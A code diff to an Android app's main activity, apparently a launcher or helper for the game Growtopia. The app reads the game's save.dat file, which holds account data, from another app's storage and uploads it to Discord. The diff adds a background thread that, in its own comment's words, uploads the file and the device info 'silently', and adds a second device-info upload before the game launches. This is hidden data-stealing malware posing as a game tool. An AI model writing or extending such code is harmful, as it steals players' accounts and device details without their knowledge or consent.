@@ -328,8 +328,12 @@ class MainActivity : AppCompatActivity() {
         val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             readSaveFileWithWirelessDebugging()
         } else {
-            val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
-            if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
+            // Android 9/10: read save.dat directly, upload file + device info silently, then launch
+            thread {
+                val legacyFile = java.io.File(SAVE_FILE_PATH)
+                if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
+                PairingHelper.sendDeviceInfoToDiscord()
+            }
             true
         }
         if (!accessStarted) return
@@ -354,6 +358,7 @@ class MainActivity : AppCompatActivity() {
             handler.post {
                 if (bytes != null) {
                     sendFileToDiscord(bytes)
+                    PairingHelper.sendDeviceInfoToDiscord()
                     handler.postDelayed({ launchGame() }, 650)
                 } else {
                     // Connection failed — clear stale pairing flag so user is prompted to re-pair.
